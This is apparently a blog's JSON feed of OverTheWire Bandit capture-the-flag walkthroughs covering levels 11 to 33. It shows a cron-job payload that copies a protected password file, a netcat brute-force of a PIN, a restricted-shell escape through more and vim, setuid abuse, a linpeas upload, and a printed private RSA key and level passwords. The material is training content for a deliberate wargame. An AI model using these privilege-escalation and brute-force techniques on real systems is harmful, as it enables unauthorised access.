passwd &amp;&amp; chmod 777 passwdbandit23@bandit:/tmp/t00$ cp payload.sh /var/spool/bandit24/foo/bandit23@bandit:/tmp/t00$ cat passwdgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8bandit23@bandit:/tmp/t00$Explanation  The cron job file (/etc/cron.d/cronjob_bandit24) runs a script (/usr/bin/cronjob_bandit24.sh) as the user bandit24.  The cron job executes every minute (* * * * * bandit24) and on reboot (@reboot bandit24).  The script processes files in /var/spool/bandit24/foo/ and executes them if they are owned by bandit23.  Since we lack permission to read /etc/bandit_pass/bandit24, we created a script (payload.sh) that writes the password to a readable file (/tmp/t00/passwd) and placed it in the monitored directory (/var/spool/bandit24/foo/).  The cron job executed payload.sh, allowing us to retrieve the password.## Bandit Level 24 → Level 25Level GoalA daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.You do not need to create new connections each timebandit24@bandit:/tmp/tmp.89890$ for i in $(seq -f \"%04g\" 0 9999); do   echo \"$(cat /etc/bandit_pass/bandit24) $i\"; done &gt;&gt; pass.txt  bandit24@bandit:/tmp/tmp.89890$ head -n 3 pass.txt &amp;&amp; cat pass.txt | wc -lgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 000210000bandit24@bandit:/tmp/tmp.89890$ cat pass.txt | nc localhost 30002 &gt; out.txt bandit24@bandit:/tmp/tmp.89890$ cat out.txt | grep -v \"Wrong!\"I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.Correct!The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4bandit24@bandit:/tmp/tmp.89890$Explanation  We have generated range of password pincode combination pairs in the pass.txt file, where the password for bandit24 is paired with each 4-digit combination.  The total number of entries in pass.txt was confirmed using cat pass.txt | wc -l, which showed 10,000 entries.  The contents of pass.txt were piped to nc (netcat) to send the password-pincode pairs to a service running on localhost on port 30002  After filtering the responses, the correct password for bandit25 was identified.Bandit Level 25 → Level 26Level GoalLogging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.  Note: if you’re a Windows user and typically use Powershell to ssh into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ~                                                                                                                      \"/etc/bandit_pass/bandit26\" [readonly] 1L, 33B                                                                                                                            1,1           Allbandit25@bandit:~$                               Explanation  In this level, it was crucial to think outside the box to overcome the challenge. Initially, various commands were tried to break out of the restricted shell and gain access, but none of them worked. After several attempts, it became clear that traditional methods wouldn’t work, so the next step was to consult a cheat sheet for insights and alternative approaches to bypass the restrictions.  As the script is executing the more is displaying the banner we need to fully zoom the screen so that the more goes into command line  Once the command line was visible, the next step was to press the v key. Pressing v within the more environment switched the interface into vim mode, a text editor that allows for more interactive control over the terminal. In vim, users have the ability to edit files, navigate within them, and execute commands. To proceed, the file containing the password for the next level could be accessed by entering the command :e /etc/bandit_pass/bandit26. This command opened the password file, revealing the password for bandit26, which could then be used to log in to the next level and continue progressing through the challengeBandit Level 26 → Level 27Level GoalGood job getting a shell! Now hurry and grab the password for bandit27!$ lsbandit27-do  text.txt$ file bandit27-dobandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=368cd8ac4633fabdf3f4fb1c47a250634d6a8347, for GNU/Linux 3.2.0, not stripped$ ./bandit27-do cat /etc/bandit\\_pass/bandit27upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB$ ./bandit27-do cat /etc/bandit_pass/bandit27upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB$Explanation  The bandit26 user cannot log in directly through SSH due to the restricted shell. The shell for the user is set as /usr/bin/showtext as shown in the /etc/passwd entry:  bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext.  Access to a shell can be gained by exploiting the vim binary using the technique found in GTFOBins. This allows spawning an interactive shell despite the restrictions.  After obtaining shell access, it is possible to inspect the directory and find a file named bandit27-do. This file is a setuid binary that can execute commands as the bandit27 user. The file details can be confirmed using the file command:  The bandit27-do binary can be used to read the contents of /etc/bandit_pass/bandit27, which contains the password for the bandit27 user. The password can be retrieved by running the following command:  ./bandit27-do cat /etc/bandit_pass/bandit27.  The output will reveal the password for the next level:  upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB.Bandit Level 27 → Level 28Level GoalThere is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.Clone the repository and find the password for the next level.bandit27@bandit:/tmp/tmp.5989459$ git clone \"ssh://bandit27-git@localhost:2220/home/bandit27-git/repo\"Cloning into 'repo'...The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesCould not create directory '/home/bandit27/.ssh' (Permission denied).Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).                         _                     _ _ _                        | |__   __ _ _ __   __| (_) |_                        | '_ \\ / _` | '_ \\ / _` | | __|                        | |_) | (_| | | | | (_| | | |_                        |_.__/ \\__,_|_| |_|\\__,_|_|\\__|                      This is an OverTheWire game server.            More information on http://www.overthewire.org/wargamesbandit27-git@localhost's password:remote: Enumerating objects: 3, done.remote: Counting objects: 100% (3/3), done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Receiving objects: 100% (3/3), 286 bytes | 286.00 KiB/s, done.bandit27@bandit:/tmp/tmp.5989459$ lsrepobandit27@bandit:/tmp/tmp.5989459$ cd repo/bandit27@bandit:/tmp/tmp.5989459/repo$ lsREADMEbandit27@bandit:/tmp/tmp.5989459/repo$ cat READMEThe password to the next level is: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcNbandit27@bandit:/tmp/tmp.5989459/repo$Bandit Level 28 → Level 29Level GoalThere is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.Clone the repository and find the password for the next level.bandit28@bandit:/tmp/tmp-67890$ git clone \"ssh://bandit28-git@localhost:2220/home/bandit28-git/repo\"Cloning into 'repo'...bandit28-git@localhost's password:Receiving objects: 100% (9/9), done.Resolving deltas: 100% (2/2), done.bandit28@bandit:/tmp/tmp-67890$ cd repo/bandit28@bandit:/tmp/tmp-67890/repo$ lsREADME.mdbandit28@bandit:/tmp/tmp-67890/repo$ cat README.md# Bandit NotesSome notes for level29 of bandit.## credentials- username: bandit29- password: xxxxxxxxxxbandit28@bandit:/tmp/tmp-67890/repo$ git logcommit 817e303aa6c2b207ea043c7bba1bb7575dc4ea73 (HEAD -&gt; master, origin/master, origin/HEAD)Author: Morla Porla &lt;morla@overthewire.org&gt;Date:   Thu Sep 19 07:08:39 2024 +0000    fix info leakcommit 3621de89d8eac9d3b64302bfb2dc67e9a566decdAuthor: Morla Porla &lt;morla@overthewire.org&gt;Date:   Thu Sep 19 07:08:39 2024 +0000    add missing datacommit 0622b73250502618babac3d174724bb303c32182Author: Ben Dover &lt;noone@overthewire.org&gt;Date:   Thu Sep 19 07:08:39 2024 +0000    initial commit of README.mdbandit28@bandit:/tmp/tmp-67890/repo$ git checkout 3621de89d8eac9d3b64302bfb2dc67e9a566decdPrevious HEAD position was 817e303 fix info leakHEAD is now at 3621de8 add missing databandit28@bandit:/tmp/tmp-67890/repo$ cat README.md# Bandit NotesSome notes for level29 of bandit.## credentials- username: bandit29- password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7bandit28@bandit:/tmp/tmp-67890/repo$Theory  git log shows us the commit log.  git show &lt;commit&gt; shows us the content of a commit (When creating a public repository it is important to be aware of the information you push to it since changes and previous versions are saved. So sensitive data, like passwords, could still be retrieved).Explanation      The Git repository was cloned using the following command:git clone \"ssh://bandit28-git@localhost:2220/home/bandit28-git/repo\".This command connects to the repository using the specified SSH protocol and port 2220. After cloning, the repository contained a single file named README.md.        Upon inspecting the README.md file using cat README.md, it was discovered that the file contained obfuscated credentials for level 29. These credentials were intentionally hidden in the latest commit.    The commit history of the repository was checked using the git log command. This command displayed the history of commits, including their hashes, authors, and timestamps. Three commits were identified in the log:          The first commit: Initial commit of the README.md.      The second commit: Added missing data.      The third commit: Fixed an information leak.            Each commit was checked individually by using the git checkout &lt;commit-hash&gt; command to switch to a specific commit. The file content in each commit was then examined.          In the first commit, the file contained no relevant information.              In the second commit, the credentials for level 29 were revealed in the README.md file as follows:        - username: bandit29  - password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7                      The third commit had the credentials obfuscated.        By analyzing the commit history and accessing previous commits, the hidden credentials were successfully retrieved.Bandit Level 29 → Level 30Level GoalThere is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.Clone the repository and find the password for the next level.bandit29@bandit:/tmp/tmp-0987$ git clone \"ssh://bandit29-git@localhost:2220/home/bandit29-git/repo\"Cloning into 'repo'...The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.bandit29-git@localhost's password:Receiving objects: 100% (16/16), done.Resolving deltas: 100% (2/2), done.bandit29@bandit:/tmp/tmp-0987/repo$ cat README.md# Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: &lt;no passwords in production!&gt;bandit29@bandit:/tmp/tmp-0987/repo$ git remote show originbandit29-git@localhost's password:* remote origin  Fetch URL: ssh://bandit29-git@localhost:2220/home/bandit29-git/repo  Push  URL: ssh://bandit29-git@localhost:2220/home/bandit29-git/repo  HEAD branch: master  Remote branches:    dev         tracked    master      tracked    sploits-dev tracked  Local branch configured for 'git pull':    master merges with remote master  Local ref configured for 'git push':    master pushes to master (up to date)bandit29@bandit:/tmp/tmp-0987/repo$ git checkout devPrevious HEAD position was 6ac7796 fix usernamebranch 'dev' set up to track 'origin/dev'.Switched to a new branch 'dev'bandit29@bandit:/tmp/tmp-0987/repo$ cat README.md# Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZLTheory:Git branching is another feature of the version control system. It allows you to split the development into different branches. Specifically, there is a master branch from which the software can be taken and it can be separately worked on. You can change and add features while still maintaining a working master branch. Once the work is done, it can be integrated into the master branch again. This allows for additional version control. You can offer a production branch with usable software, while fixing bugs or adding features in a different development branch.The basic commands for working with branches are:  git branch: List (-a), create, or delete branches  git checkout /git switch : Switch branches  git merge: Join two or more branchesExplanation  After cloning the Git repository, the README.md file did not contain the password as it mentioned “no passwords in production!”.  The remote repository was inspected using the git remote show origin command, which revealed multiple branches: master, dev, and sploits-dev.  The dev branch was identified as a possible source of the credentials.  By switching to the dev branch using git checkout dev, the password for the next level was found in the README.md file.Bandit Level 30 → Level 31Level GoalThere is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.Clone the repository and find the password for the next level.bandit30@bandit:/tmp/tmp-5678$ git clone \"ssh://bandit30-git@localhost:2220/home/bandit30-git/repo\"Cloning into 'repo'...The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.bandit30-git@localhost's password:Receiving objects: 100% (4/4), done.bandit30@bandit:/tmp/tmp-5678/repo$ cat README.mdjust an epmty file... muahahabandit30@bandit:/tmp/tmp-5678/repo$ git tagsecretbandit30@bandit:/tmp/tmp-5678/repo$ git show secretfb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDyTheory:Git tagging is a way to mark specific points in the history of the repository. One example would be to mark release points of the software. The command to see the tags is git tag. To create a tag the command is git tag -a  -m &lt;\"tag description/message\"&gt;. To see more details, like the tag message and commit, you can use the following command: git show .Explanation  After cloning the Git repository, the README.md file was found to be empty with a humorous message “just an empty file… muahaha”.  Upon inspecting the repository, the git tag command revealed the presence of a tag named secret.  Using git show secret, the password for the next level was revealed as fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy.Bandit Level 31 → Level 32Level GoalThere is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.Clone the repository and find the password for the next level.bandit31@bandit:/tmp/mp-1234$ git clone \"ssh://bandit31-git@localhost:2220/home/bandit31-git/repo\"Cloning into 'repo'...The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.bandit31-git@localhost's password:Permission denied, please try again.remote: Counting objects: 100% (4/4), done.remote: Compressing objects: 100% (3/3), done.Receiving objects: 100% (4/4), done.bandit31@bandit:/tmp/mp-1234/repo$ cat README.mdThis time your task is to push a file to the remote repository.Details:    File name: key.txt    Content: 'May I come in?'    Branch: masterbandit31@bandit:/tmp/mp-1234/repo$ echo \"May I come in?\" &gt; key.txtbandit31@bandit:/tmp/mp-1234/repo$ git add * -fbandit31@bandit:/tmp/mp-1234/repo$ git statusOn branch masterYour branch is ahead of 'origin/master' by 1 commit.  (use \"git push\" to publish your local commits)Changes to be committed:  (use \"git restore --staged &lt;file&gt;...\" to unstage)        modified:   key.txtbandit31@bandit:/tmp/mp-1234/repo$ git commit -m \"let me in\"[master b4c589b] let me in 1 file changed, 1 insertion(+), 7 deletions(-)bandit31@bandit:/tmp/mp-1234/repo$ git pushCounting objects: 100% (6/6), done.Delta compression using up to 2 threadsCompressing objects: 100% (4/4), done.Writing objects: 100% (5/5), 511 bytes | 511.00 KiB/s, done.Total 5 (delta 1), reused 0 (delta 0), pack-reused 0remote: ### Attempting to validate files... ####remote:remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote:remote: Well done! Here is the password for the next level:remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5Kremote:remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote:remote:remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote:To ssh://localhost:2220/home/bandit31-git/repo ! [remote rejected] master -&gt; master (pre-receive hook declined)TheoryGit Ignore is a file with the filename .gitignore. In this file, all file names/extensions that should be ignored by the commit are written. This means if a file which is in the ignore file is created/changed, it will not be part of the commit/repository. Git ignore also allows for wildcards. (For example, : *.txt means all files with the ending .txt will be ignored.).bandit31@bandit:/tmp/mp-1234$ git clone \"ssh://bandit31-git@localhost:2220/home/bandit31-git/repo\"Cloning into 'repo'...The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.bandit31-git@localhost's password:Permission denied, please try again.remote: Counting objects: 100% (4/4), done.remote: Compressing objects: 100% (3/3), done.Receiving objects: 100% (4/4), done.bandit31@bandit:/tmp/mp-1234/repo$ cat README.mdThis time your task is to push a file to the remote repository.Details:    File name: key.txt    Content: 'May I come in?'    Branch: masterbandit31@bandit:/tmp/mp-1234/repo$ echo \"May I come in?\" &gt; key.txtbandit31@bandit:/tmp/mp-1234/repo$ git add * -fbandit31@bandit:/tmp/mp-1234/repo$ git statusOn branch masterYour branch is ahead of 'origin/master' by 1 commit.  (use \"git push\" to publish your local commits)Changes to be committed:  (use \"git restore --staged &lt;file&gt;...\" to unstage)        modified:   key.txtbandit31@bandit:/tmp/mp-1234/repo$ git commit -m \"let me in\"[master b4c589b] let me in 1 file changed, 1 insertion(+), 7 deletions(-)bandit31@bandit:/tmp/mp-1234/repo$ git pushCounting objects: 100% (6/6), done.Delta compression using up to 2 threadsCompressing objects: 100% (4/4), done.Writing objects: 100% (5/5), 511 bytes | 511.00 KiB/s, done.Total 5 (delta 1), reused 0 (delta 0), pack-reused 0remote: ### Attempting to validate files... ####remote:remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote:remote: Well done! Here is the password for the next level:remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5Kremote:remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote:remote:remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote:To ssh://localhost:2220/home/bandit31-git/repo ! [remote rejected] master -&gt; master (pre-receive hook declined)Explanation  After cloning the Git repository, the README.md file specified that the task was to push a file named key.txt with the content “May I come in?” to the remote repository on the master branch.  A new file named key.txt was created with the required content, and the changes were staged using git add * -f.  The status confirmed that the changes were staged and ready to be committed.  The file was committed with the message “let me in” and pushed to the remote repository using git push.  Upon successful push, the remote server returned a message indicating successful validation and revealed the password for the next level: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K.Bandit Level 32 → Level 33Level GoalAfter all this git stuff, it’s time for another escape. Good luck!&gt;&gt; $0$ ls -lahtotal 36Kdrwxr-xr-x  2 root     root     4.0K Sep 19 07:08 .drwxr-xr-x 70 root     root     4.0K Sep 19 07:09 ..-rw-r--r--  1 root     root      220 Mar 31  2024 .bash_logout-rw-r--r--  1 root     root     3.7K Mar 31  2024 .bashrc-rw-r--r--  1 root     root      807 Mar 31  2024 .profile-rwsr-x---  1 bandit33 bandit32  15K Sep 19 07:08 uppershell$ whoamibandit33$ cat /etc/bandit_pass/bandit33tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0$ TheoryA restricted shell is used to enforce a controlled environment for users, restricting access to certain commands (like cd, exec, and set), limiting the ability to execute scripts or binaries outside of designated directories, and preventing access to sensitive system information. It’s often used in CTF challenges and for users that need to be isolated from the broader system to minimize security risks or to focus on specific tasks.When logging into an SSH session, the prompt &gt;&gt; indicates that the user is operating in a restricted shell environment. A restricted shell limits what the user can do and restricts access to certain commands and functionalities. The purpose of such an environment is to limit a user’s actions and provide them only with the essential tools to complete specific tasks, often as part of a security or challenge setup, such as in CTF (Capture The Flag) challenges.The restricted shell, often used in certain scenarios like system hardening, prevents the execution of potentially dangerous or unnecessary commands and can force the user into a particular context or program. In this case, &gt;&gt; is used to signify that the user is likely in a custom shell or controlled environment, which may not offer full bash or shell functionality.Explanation:  After logging into the SSH session, the &gt;&gt; prompt indicates that the user is in a restricted shell. This is typically set up for certain users to limit the available commands and actions that can be performed.  The prompt &gt;&gt; often suggests that the user is not in a normal shell, but instead in a controlled environment where commands are either restricted or filtered.  The whoami command confirms that the user is bandit33.  The cat /etc/bandit_pass/bandit33 command reveals the password for the next level, tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0, which will be used for authentication in the next level."
  },
  
  {
    "title": "OverTheWire Wargames bandit => 2",
    "url": "/posts/bandit-2/",
    "categories": "CTF, community",
    "tags": "",
    "date": "2025-01-25 00:00:00 +0530",
    





    
    "snippet": "OverTheWire is a platform that provides a collection of wargames designed to help individuals enhance their knowledge of cybersecurity. It’s ideal for both beginners and experienced security enthus...",
    "content": "OverTheWire is a platform that provides a collection of wargames designed to help individuals enhance their knowledge of cybersecurity. It’s ideal for both beginners and experienced security enthusiasts looking to expand their skill set in a practical and engaging way.The platform’s wargames are structured to help users progress step-by-step, starting with basic tasks and advancing to more complex challenges. This makes it an excellent tool for learning concepts such as:  Linux/Unix Basics: It introduces beginners to command-line tasks, file manipulation, and system navigation, providing a solid foundation in operating systems.  Networking and Protocols: Challenges related to TCP/IP, HTTP, and other networking protocols teach how to analyze and interact with network traffic, offering insight into penetration testing techniques.  Cryptography: OverTheWire covers fundamental cryptographic concepts, teaching users how to exploit weaknesses in encryption systems and improve their understanding of security protocols.  Web Security: The platform includes practical lessons on common web vulnerabilities such as SQL Injection, Cross-Site Scripting (XSS), and other issues that are crucial for web application security.  Reverse Engineering: Users can dive into reverse engineering challenges to understand how to disassemble and manipulate programs, gaining valuable insight into software vulnerabilities.  Forensics: OverTheWire also helps users build skills in digital forensics by analyzing compromised data, investigating file systems, and extracting hidden information.Bandit, the most popular wargame on OverTheWire, is a great starting point for beginners. It introduces users to basic security concepts and Linux commands, offering a fun, interactive way to start learning. As players progress through the game, they tackle increasingly challenging puzzles that simulate real-world hacking scenarios.In essence, OverTheWire offers a unique, hands-on learning experience where users can practice ethical hacking in a safe, controlled environment. Whether you’re looking to break into the world of cybersecurity or deepen your existing knowledge, OverTheWire provides a wealth of challenges to help you sharpen your skills.This is a continuation from Part 2 of the Bandit Wargame series. If you haven’t checked out Part 1 blog, I highly recommend giving it a read before proceeding, as it covers foundational skills essential for tackling these levels.Now, let’s pick up where we left off and dive deeper into the challenges, starting from Bandit Level 11. These levels will introduce more advanced concepts, helping you sharpen your Linux skills further. Let’s get started!Bandit Level 11 → Level 12Level GoalThe password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positionsbandit11@bandit:~$ cat data.txtGur cnffjbeq vf 7k16JArUVv5LxVuJfsSVdbbtaHGlw9D4bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'The password is 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4bandit11@bandit:~$Explanaitonthe tr (translate) command in Linux or Unix-like systems to perform a character-by-character transformation of text. Specifically, this command implements the ROT13 cipher for encoding or decoding text.ROT13 (short for “rotate by 13 places”) is a simple letter substitution cipher used primarily for obscuring text. It replaces each letter of the alphabet with the letter 13 positions ahead of it. Since there are 26 letters in the English alphabet, applying ROT13 twice (rotating 13 positions forward and then 13 positions back) restores the original text.For example:  “A” becomes “N”  “B” becomes “O”  “C” becomes “P”  “Z” becomes “M”The beauty of ROT13 is its simplicity. It is often used in online forums or email to obscure spoilers, puzzle answers, or sensitive information, as it does not provide real encryption but just hides the content in plain view.Bandit Level 12 → Level 13Level GoalThe password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work. Use mkdir with a hard to guess directory name. Or better, use the command “mktemp -d”. Then copy the datafile using cp, and rename it using mv (read the manpages!)bandit12@bandit:~$ mktemp -d/tmp/tmp.1gzcyg61Ekbandit12@bandit:~$ cd /tmp/tmp.1gzcyg61Ekbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ cp ~/data.txt .bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ xxd -r data.txt binarybandit12@bandit:/tmp/tmp.1gzcyg61Ek$ lsbinary  data.txtbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file binarybinary: gzip compressed data, was \"data2.bin\", last modified: Thu Sep 19 07:08:15 2024, max compression, from Unix, original size modulo 2^32 574bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ mv binary binary.gzbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ gzip -d binary.gzbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ lsbinary  data.txtbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file binarybinary: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ mv binary binary.bz2bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ bzip2 -d binary.bz2bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file binarybinary: gzip compressed data, was \"data4.bin\", last modified: Thu Sep 19 07:08:15 2024, max compression, from Unix, original size modulo 2^32 20480bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ mv binary binary.gzbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ gzip -d binary.gzbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file binarybinary: POSIX tar archive (GNU)bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ tar -xf binarybandit12@bandit:/tmp/tmp.1gzcyg61Ek$ lsbinary  data5.bin  data.txtbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file data5.bindata5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ tar -xf data5.binbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ lsbinary  data5.bin  data6.bin  data.txtbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file data6.bindata6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ mv data6.bin data6.bz2bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ bzip2 -d data6.bz2bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ lsbinary  data5.bin  data6  data.txtbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file data6data6: POSIX tar archive (GNU)bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ tar -xf data6bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ lsbinary  data5.bin  data6  data8.bin  data.txtbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file data8.bindata8.bin: gzip compressed data, was \"data9.bin\", last modified: Thu Sep 19 07:08:15 2024, max compression, from Unix, original size modulo 2^32 49bandit12@bandit:/tmp/tmp.1gzcyg61Ek$ mv data8.bin data8.gzbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ gzip -d data8.gzbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ lsbinary  data5.bin  data6  data8  data.txtbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ file data8data8: ASCII textbandit12@bandit:/tmp/tmp.1gzcyg61Ek$ cat data8The password is FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAnExplanation  Create a temp directory using mktemp -d, copy data.txt into it and reverse the hex dump with xxd -r to get the binary file.  Identify the file type with file and decompress or extract it repeatedly based on its format:          For gzip: Rename with .gz and decompress using gzip -d.      For bzip2: Rename with .bz2 and decompress using bzip2 -d.      For tar archives: Extract using tar -xf.        Repeat the process (analyzing and decompressing/extracting) until reaching the final file.  Read the final ASCII text file using cat, which revealed the passwordBandit Level 13 → Level 14Level GoalThe password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level.  Note: localhost is a hostname that refers to the machine you are working onbandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ cat sshkey.private-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgBZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6ZbThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsVObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeAJ3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzEpvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VSnXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsDo3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwheol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUflaL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrSM1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JHPKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbYiDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeDqT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==-----END RSA PRIVATE KEY-----bandit13@bandit:~$ ssh bandit14@localhost -p 2220 -i sshkey.privateBandit Level 14 → Level 15Level GoalThe password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.bandit14@bandit:~$ echo \"test\" | nc localhost 30000Wrong! Please enter the correct current password.bandit14@bandit:~$ mkdir /tmp/tmp.testing/❯ scp -i key -P 2220 linpeas.sh bandit14@bandit.labs.overthewire.org:/tmp/tmp.testing/linpeassh                                                100%  820KB 516.7KB/s   